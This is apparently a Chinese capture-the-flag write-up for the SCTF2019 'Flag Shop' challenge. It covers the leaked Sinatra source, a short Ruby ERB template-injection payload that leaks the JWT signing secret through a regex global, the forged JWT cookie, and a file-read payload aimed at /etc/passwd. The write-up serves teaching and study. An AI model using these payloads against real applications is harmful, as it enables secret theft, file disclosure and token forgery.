# \[SCTF2019]Flag Shop

## \[SCTF2019]Flag Shop

## 考点



## wp

给了uid，金坷垃，flag价格三个参数，同时三个按钮，抓包。

`buy flag`按钮是POST请求`/shop`，在后端判断金坷垃是否够买flag

`reset`是GET请求`/api/auth`，返回新的cookie，`auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJhOTNkMDI3MS1iYjZlLTQyNTEtOGQ5Mi1lZjgxOWY1MTgxODQiLCJqa2wiOjIwfQ.F4fAw7T3hcalQsKyKjkLs6zbylPHTKEj6s9pJ7_XEcA`，然后请求`/shop`获取主页，最后请求`/api/info`，获取用户uid和金坷垃

&#x20;work是GET请求`/work?name=bot&do=bot%20is%20working`，随机增加金坷垃，然后请求`/shop`获取主页，最后请求`/api/info`，获取用户uid和金坷垃

把cookie放在[`jwt.io`](https://jwt.io)看一下

![](<../.gitbook/assets/image (10).png>)

需要密钥才能修改，尝试jwt-crack破解未果



扫目录，发现`robots.txt`，提示访问`/filebak`，得到源码

```javascript
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

查一下sinatra是ruby的一个Web框架，erb是ruby自带的模板渲染包，如果输入可控，它会导致模板注入。

```ruby
require 'erb'

template = "text to be generated: <%= x %>"
erb_object = ERB.new(template)
x = 7*7
puts erb_object.result(binding())
```

枚举当前类的可用方法

```ruby
require 'erb'

template = "text to be generated: <%= x %>"
erb_object = ERB.new(template)
x = self.methods
puts erb_object.result(binding())
```

Ruby ERB模板注入读取文件的payload：`<%= File.open('/etc/passwd').read %>`

看给的代码，在访问work时，有两个判断

一个是传入`SECRET`参数，`params[:SECRET].nil?`判断是否传入`SECRET`参数，然后匹配`SECRET`中的小写字母和数字并返回，再用`#{}`获取这个变量，最后和`ENV["SECRET"]`进行匹配。

> `#{var}`在Ruby中进行变量替换。例如
>
> ```
> name="Jack"
> puts "His name i #{name}." 
> ```

> match是进行匹配。例如
>
> ```
> name = "peri0dLL".match(/[0-9a-z]+/)
> puts "His name i #{name}." 
> ```

另外是传入do和name参数，满足`name[0:7] is working==do`，然后使用ERB渲染`name`

```ruby
get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end
```

也就是说，传入的name不超过7个字符，并且符合这种形式`name=1234567&do=1234567 is working`。而ERB模板渲染的字符`<%=%>`就用了5个，只有两个字符可用。

使用`<%=1%>`测试，URL编码之后再传入

![](<../.gitbook/assets/image (19).png>)

这里先进行两次匹配操作，还能够进行模板注入，可以通过模板注入返回全局变量

```ruby
#!/usr/bin/ruby
# -*- coding: UTF-8 -*-
TEXT = "PREFIX.body.SUFFIX"
s = "prefix.body.suffix".match("#{TEXT.match(/[0-9a-z]+/)}")
puts s
puts $~
puts $`
puts $'
```

输出

```
body
body
prefix.
.suffix
```

payload：`GET /work?name=%3c%25%3d%24'%25%3e&do=%3c%25%3d%24'%25%3e%20is%20working&SECRET=`

![](<../.gitbook/assets/image (17).png>)

得到密钥

```
e116342f880734ac2a7b278cf120d847f420a344d98fc55b294c5eb4eae619ee50360e28da770ed194bf743b0dd611187f9ebd79c4c5d98dfbaa72db2d109987
```

jkl改成10000000000000000000000000000重新加密

```
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJkNmRmOTQwYi1kZWIzLTQ3MGEtOGE3Yy1lYTE5MzRmZWNkMjUiLCJqa2wiOjFlKzI4fQ.hVvQKdiKAVU_i0oEjUPdFyyby_Rx3NWTLzWTQE-mnq4
```

更改cookie再点击`buy flag`，在cookie中返回flag

```ruby
auth << {flag: ENV["FLAG"]}
auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
cookies[:auth] = auth
json({title: "success",message: "jkl is good thing"})
```

## 小结

1. [Ruby ERB模板注入](https://forum.butian.net/share/977)
2. [手把手教你如何完成Ruby ERB模板注入](https://zhuanlan.zhihu.com/p/29440823)
